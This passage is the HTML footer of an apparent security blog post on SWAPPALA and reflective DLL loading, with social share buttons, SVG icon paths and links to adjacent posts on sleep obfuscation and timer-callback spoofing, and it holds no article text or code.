011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f;title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever" target="_blank" rel="noopener" aria-label="" title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="whatsapp://send?text=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&amp;t=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever" target="_blank" rel="noopener" aria-label="" title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></div></div></a></div><div class="pagination"><div class="pagination__buttons"><span class="button previous"><a href="https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/"><span class="button__icon">‚Üê</span>
<span class="button__text">Timer Callbacks Spoofing to Improve your SLEAP and SWAPPALA Untold</span>
</a></span><span class="button next"><a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/"><span class="button__text">SWAPPALA: Why Change When You Can Hide?</span>
<span class="button__icon">‚Üí</span></a></span></div></div></main></div></div></body></html>